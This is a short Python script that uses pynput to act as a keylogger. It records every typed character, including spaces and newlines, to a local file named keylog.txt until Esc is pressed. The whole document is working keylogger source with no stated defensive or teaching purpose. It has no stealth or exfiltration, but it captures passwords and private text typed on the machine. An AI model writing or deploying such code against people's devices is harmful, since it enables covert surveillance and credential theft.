from pynput import keyboard

# Define the path for the log file
log_file_path = "keylog.txt"

# Function to write keystrokes to the log file
def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            # Handle spaces and avoid logging certain keys like Ctrl
            if key == keyboard.Key.space:
                log_file.write(' ')
            elif key == keyboard.Key.enter:
                log_file.write('\n')
            elif key not in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                log_file.write(key.char)
    except AttributeError:
        pass

# Function to handle the stopping of the listener
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Create a listener for keypresses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()